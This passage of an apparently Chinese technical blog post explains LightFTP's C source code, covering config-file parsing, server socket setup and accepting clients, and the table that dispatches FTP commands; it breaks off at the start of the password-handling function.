class="line">accs=upload</span><br><span class="line">root=/home/user/ftpshare</span><br><span class="line"></span><br><span class="line">[webadmin]</span><br><span class="line">pswd=VeryStrongadminpassword222</span><br><span class="line">accs=admin</span><br><span class="line">root=/home/user/ftpshare</span><br></pre></td></tr></table></figure>
<ul>
<li>大括号容就是 <code>section_name</code></li>
<li>等号左边的内容就是 <code>key_name</code>，右边的内容就是将要被设置的值</li>
</ul>
<p>使用函数 <code>config_parse</code> 需要指定 <code>section_name</code> 和 <code>key_name</code>，该函数会把对应的值提取到参数 <code>value</code> 中，然后外传到上层函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">config_parse</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *pcfg,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *section_name,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> <span class="keyword">char</span>      *key_name,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">char</span>            *value,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">unsigned</span> <span class="keyword">long</span>   value_size_max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>	sp;</span><br><span class="line">	<span class="keyword">char</span>			vname[<span class="number">256</span>], *p = (<span class="keyword">char</span> *)pcfg;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (value_size_max == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	--value_size_max;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (*p != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		p = skip_comments_and_blanks(p);</span><br><span class="line">		<span class="keyword">if</span> (*p == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (*p != <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			++p;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		++p;</span><br><span class="line">		sp = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (</span><br><span class="line">				(*p != <span class="string">&#x27;]&#x27;</span>) &amp;&amp;</span><br><span class="line">				(*p != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">				(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">				(sp &lt; <span class="number">255</span>)</span><br><span class="line">				)</span><br><span class="line">		&#123;</span><br><span class="line">			vname[sp] = *p;</span><br><span class="line">			++sp;</span><br><span class="line">			++p;</span><br><span class="line">		&#125;</span><br><span class="line">		vname[sp] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span> (*p == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (*p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		++p;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(vname, section_name) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				p = skip_comments_and_blanks(p);</span><br><span class="line">				<span class="keyword">if</span> ((*p == <span class="number">0</span>) || (*p == <span class="string">&#x27;[&#x27;</span>))</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				sp = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">while</span> (</span><br><span class="line">						(*p != <span class="string">&#x27;=&#x27;</span>) &amp;&amp;</span><br><span class="line">						(*p != <span class="string">&#x27; &#x27;</span>) &amp;&amp;</span><br><span class="line">						(*p != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">						(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">						(sp &lt; <span class="number">255</span>)</span><br><span class="line">						)</span><br><span class="line">				&#123;</span><br><span class="line">					vname[sp] = *p;</span><br><span class="line">					++sp;</span><br><span class="line">					++p;</span><br><span class="line">				&#125;</span><br><span class="line">				vname[sp] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">if</span> (*p == <span class="number">0</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">while</span> (*p == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">					++p;</span><br><span class="line">				<span class="keyword">if</span> (*p != <span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				p++;</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(vname, key_name) == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					sp = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">while</span> (</span><br><span class="line">							(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">							(*p != <span class="number">0</span>)</span><br><span class="line">							)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (sp &lt; value_size_max)</span><br><span class="line">							value[sp] = *p;</span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">							<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">						++sp;</span><br><span class="line">						++p;</span><br><span class="line">					&#125;</span><br><span class="line">					value[sp] = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">while</span> (</span><br><span class="line">							(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">							(*p != <span class="number">0</span>)</span><br><span class="line">							)</span><br><span class="line">						++p;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">while</span> (*p != <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				p = skip_comments_and_blanks(p);</span><br><span class="line">				<span class="keyword">if</span> ((*p == <span class="number">0</span>) || (*p == <span class="string">&#x27;[&#x27;</span>))</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">while</span> (</span><br><span class="line">						(*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;</span><br><span class="line">						(*p != <span class="number">0</span>)</span><br><span class="line">						)</span><br><span class="line">					++p;</span><br><span class="line">			&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数 <code>config_parse</code> 总体的思路就是利用2个 <code>while</code> 循环来变量所有的 <code>section_name</code> 和 <code>key_name</code>：</p>
<ul>
<li>外层的循环会匹配大括号 <code>[]</code>，用一个 <code>while</code> 读取出 <code>section_name</code> 然后进行匹配：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(vname, section_name) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>内层的循环会匹配等号 <code>=</code>，用一个 <code>while</code> 读取出 <code>key_name</code> 然后进行匹配：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(vname, key_name) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>最后用一个 <code>while</code> 把等号右边的数据存储到 <code>value</code> 中：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((*p != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp;(*p != <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (sp &lt; value_size_max)</span><br><span class="line">        value[sp] = *p;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    ++sp;</span><br><span class="line">    ++p;</span><br><span class="line">&#125;</span><br><span class="line">value[sp] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>函数 <code>config_parse</code> 最后返回的 <code>value</code> 将被会存储在结构体 <code>FTP_CONFIG</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">FTP_CONFIG</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>*           ConfigFile;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>    MaxUsers;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>    EnableKeepalive;</span><br><span class="line">    <span class="keyword">in_port_t</span>       Port;</span><br><span class="line">    <span class="keyword">in_port_t</span>       PasvPortBase;</span><br><span class="line">    <span class="keyword">in_port_t</span>       PasvPortMax;</span><br><span class="line">    <span class="keyword">in_addr_t</span>       BindToInterface;</span><br><span class="line">    <span class="keyword">in_addr_t</span>       ExternalInterface;</span><br><span class="line">    <span class="keyword">in_addr_t</span>       LocalIPMask;</span><br><span class="line">&#125; FTP_CONFIG, *PFTP_CONFIG;</span><br></pre></td></tr></table></figure>
<p><strong>LightFTP 与目标主机建立连接</strong></p>
<p>把服务器中 <code>socket bind listen</code> 的代码提取出来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    ftpsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); <span class="comment">/* 基于IPv4和TCP */</span></span><br><span class="line">    <span class="keyword">if</span> ( ftpsocket == INVALID_SOCKET )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r\n socket create error\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rv = <span class="number">1</span>;</span><br><span class="line">    setsockopt(ftpsocket, SOL_SOCKET, SO_REUSEADDR, &amp;rv, <span class="keyword">sizeof</span>(rv)); </span><br><span class="line"><span class="comment">/* SO_REUSEADDR:打开或关闭地址复用功能 */</span></span><br><span class="line"></span><br><span class="line">    scb = (SOCKET *)x_malloc(<span class="keyword">sizeof</span>(SOCKET)*g_cfg.MaxUsers);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;g_cfg.MaxUsers; i++)</span><br><span class="line">        scb[i] = INVALID_SOCKET; <span class="comment">/* 初始化为&#x27;-1&#x27; */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;laddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(laddr));</span><br><span class="line">    laddr.sin_family = AF_INET;</span><br><span class="line">    laddr.sin_port = htons(g_cfg.Port);</span><br><span class="line">    laddr.sin_addr.s_addr = g_cfg.BindToInterface;</span><br><span class="line">    socketret = bind(ftpsocket, (struct sockaddr *)&amp;laddr, <span class="keyword">sizeof</span>(laddr));</span><br><span class="line">    <span class="keyword">if</span>  ( socketret != <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\r\n Failed to start server. Can not bind to address\r\n\r\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(scb);</span><br><span class="line">        close(ftpsocket);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    writelogentry(<span class="literal">NULL</span>, success220, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    socketret = listen(ftpsocket, SOMAXCONN); <span class="comment">/* socket的排队个数为SOMAXCONN,内核规定的最大连接数 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>setsockopt</code> 函数可以对 socket 进行详细的设置</li>
<li><code>SO_REUSEADDR</code> 参数提供如下四个功能： <ul>
<li><code>SO_REUSEADDR</code> 允许启动一个监听服务器并捆绑其众所周知端口，即使以前建立的将此端口用做他们的本地端口的连接仍存在（这通常是重启监听服务器时出现，若不设置此选项，则 <code>bind</code> 时将出错）</li>
<li><code>SO_REUSEADDR</code> 允许在同一端口上启动同一服务器的多个实例，只要每个实例捆绑一个不同的本地 IP 地址即可（对于 TCP，我们根本不可能启动捆绑相同 IP 地址和相同端口号的多个服务器）</li>
<li><code>SO_REUSEADDR</code> 允许单个进程捆绑同一端口到多个套接口上，只要每个捆绑指定不同的本地 IP 地址即可。这一般不用于 TCP 服务器</li>
<li><code>SO_REUSEADDR</code> 允许完全重复的捆绑：当一个 IP 地址和端口绑定到某个套接口上时，还允许此 IP 地址和端口捆绑到另一个套接口上（一般来说，这个特性仅在支持多播的系统上才有，而且只对UDP套接口而言，TCP不支持多播）</li>
</ul>
</li>
</ul>
<p>然后再循环里面 <code>accept</code> 客户端的请求：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( socketret == <span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;laddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(laddr));</span><br><span class="line">    asz = <span class="keyword">sizeof</span>(laddr);</span><br><span class="line">    clientsocket = accept(ftpsocket, (struct sockaddr *)&amp;laddr, &amp;asz); </span><br><span class="line">    <span class="comment">/* 一次大循环连接一台客户端主机 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (clientsocket == INVALID_SOCKET) <span class="comment">/* 没有accept时则直接continue */</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    rv = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;g_cfg.MaxUsers; i++)</span><br><span class="line">        <span class="keyword">if</span> ( scb[i] == INVALID_SOCKET ) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (g_cfg.EnableKeepalive != <span class="number">0</span>)</span><br><span class="line">                socket_set_keepalive(clientsocket); </span><br><span class="line">            <span class="comment">/* 调用setsockopt对socket进行设置 */</span></span><br><span class="line">            </span><br><span class="line">            scb[i] = clientsocket;</span><br><span class="line">            rv = pthread_create(&amp;th, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))ftp_client_thread, &amp;scb[i]);</span><br><span class="line">            <span class="keyword">if</span> ( rv != <span class="number">0</span> ) <span class="comment">/* pthread_create返回&#x27;0&#x27;代表创建成功 */</span></span><br><span class="line">                scb[i] = INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( rv != <span class="number">0</span> ) &#123;</span><br><span class="line">        sendstring_plaintext(clientsocket, NOSLOTS);</span><br><span class="line">        close(clientsocket);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>g_cfg.MaxUsers</code>：服务器可以并发处理的客户端最大数目</li>
</ul>
<p><strong>LightFTP 实现 FTP 命令集</strong></p>
<p>实现 FTP 命令集的函数就是 <code>ftp_client_thread</code></p>
<p>在此之前需要介绍一下 LightFTP 中的一个结构体数组：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> FTPROUTINE_ENTRY ftpprocs[MAX_CMDS] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;USER&quot;</span>, ftpUSER&#125;, &#123;<span class="string">&quot;QUIT&quot;</span>, ftpQUIT&#125;, &#123;<span class="string">&quot;NOOP&quot;</span>, ftpNOOP&#125;, &#123;<span class="string">&quot;PWD&quot;</span>,  ftpPWD &#125;,</span><br><span class="line">        &#123;<span class="string">&quot;TYPE&quot;</span>, ftpTYPE&#125;, &#123;<span class="string">&quot;PORT&quot;</span>, ftpPORT&#125;, &#123;<span class="string">&quot;LIST&quot;</span>, ftpLIST&#125;, &#123;<span class="string">&quot;CDUP&quot;</span>, ftpCDUP&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;CWD&quot;</span>,  ftpCWD &#125;, &#123;<span class="string">&quot;RETR&quot;</span>, ftpRETR&#125;, &#123;<span class="string">&quot;ABOR&quot;</span>, ftpABOR&#125;, &#123;<span class="string">&quot;DELE&quot;</span>, ftpDELE&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;PASV&quot;</span>, ftpPASV&#125;, &#123;<span class="string">&quot;PASS&quot;</span>, ftpPASS&#125;, &#123;<span class="string">&quot;REST&quot;</span>, ftpREST&#125;, &#123;<span class="string">&quot;SIZE&quot;</span>, ftpSIZE&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;MKD&quot;</span>,  ftpMKD &#125;, &#123;<span class="string">&quot;RMD&quot;</span>,  ftpRMD &#125;, &#123;<span class="string">&quot;STOR&quot;</span>, ftpSTOR&#125;, &#123;<span class="string">&quot;SYST&quot;</span>, ftpSYST&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;FEAT&quot;</span>, ftpFEAT&#125;, &#123;<span class="string">&quot;APPE&quot;</span>, ftpAPPE&#125;, &#123;<span class="string">&quot;RNFR&quot;</span>, ftpRNFR&#125;, &#123;<span class="string">&quot;RNTO&quot;</span>, ftpRNTO&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;OPTS&quot;</span>, ftpOPTS&#125;, &#123;<span class="string">&quot;MLSD&quot;</span>, ftpMLSD&#125;, &#123;<span class="string">&quot;AUTH&quot;</span>, ftpAUTH&#125;, &#123;<span class="string">&quot;PBSZ&quot;</span>, ftpPBSZ&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;PROT&quot;</span>, ftpPROT&#125;, &#123;<span class="string">&quot;EPSV&quot;</span>, ftpEPSV&#125;, &#123;<span class="string">&quot;HELP&quot;</span>, ftpHELP&#125;, &#123;<span class="string">&quot;SITE&quot;</span>, ftpSITE&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>乍一看这个结构有点像 Python 中的字典（用于把 “FTP 命令名称” 和 “对应的函数指针” 绑定）</li>
<li>但这其实是 <code>FTPROUTINE_ENTRY</code> 类型的数组</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">FTPROUTINE_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* Name;</span><br><span class="line">    FTPROUTINE  Proc;</span><br><span class="line">&#125; FTPROUTINE_ENTRY, *PFTPROUTINE_ENTRY;</span><br></pre></td></tr></table></figure>
<p>使用这个结构体数组的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( ctx.ControlSocket != INVALID_SOCKET ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !recvcmd(&amp;ctx, rcvbuf, <span class="keyword">sizeof</span>(rcvbuf)) ) <span class="comment">/* 从客服端中读取数据 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((rcvbuf[i] != <span class="number">0</span>) &amp;&amp; (<span class="built_in">isalpha</span>(rcvbuf[i]) == <span class="number">0</span>)) <span class="comment">/* 检查输入值是否为字母,并用while跳过所有的非字母 */</span></span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">    cmd = &amp;rcvbuf[i]; <span class="comment">/* 确定ftp命令的起始地址 */</span></span><br><span class="line">    <span class="keyword">while</span> ((rcvbuf[i] != <span class="number">0</span>) &amp;&amp; (rcvbuf[i] != <span class="string">&#x27; &#x27;</span>)) <span class="comment">/* 用while跳过所有的非空格(方便计算出ftp命令的长度) */</span></span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">    cmdlen = &amp;rcvbuf[i] - cmd;</span><br><span class="line">    <span class="keyword">while</span> (rcvbuf[i] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        ++i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rcvbuf[i] == <span class="number">0</span>)</span><br><span class="line">        params = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        params = &amp;rcvbuf[i];</span><br><span class="line"></span><br><span class="line">    cmdno = <span class="number">-1</span>;</span><br><span class="line">    rv = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (c=<span class="number">0</span>; c&lt;MAX_CMDS; c++)</span><br><span class="line">        <span class="keyword">if</span> (strncasecmp(cmd, ftpprocs[c].Name, cmdlen) == <span class="number">0</span>)</span><br><span class="line">        &#123; <span class="comment">/* 遍历数组ftpprocs中所有的ftp命令,并执行目标命令 */</span></span><br><span class="line">            cmdno = c;</span><br><span class="line">            rv = ftpprocs[c].Proc(&amp;ctx, params);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( cmdno != FTP_PASSCMD_INDEX )</span><br><span class="line">        writelogentry(&amp;ctx, <span class="string">&quot; @@ CMD: &quot;</span>, rcvbuf);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        writelogentry(&amp;ctx, <span class="string">&quot; @@ CMD: &quot;</span>, <span class="string">&quot;PASS ***&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( cmdno == <span class="number">-1</span> )</span><br><span class="line">        sendstring(&amp;ctx, error500);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( rv &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>一个简单的遍历匹配</li>
</ul>
<p>最后单独介绍几个 FTP 命令的实现：</p>
<ul>
<li>匹配密码和登录设置：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpPASS</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>	temptext[<span 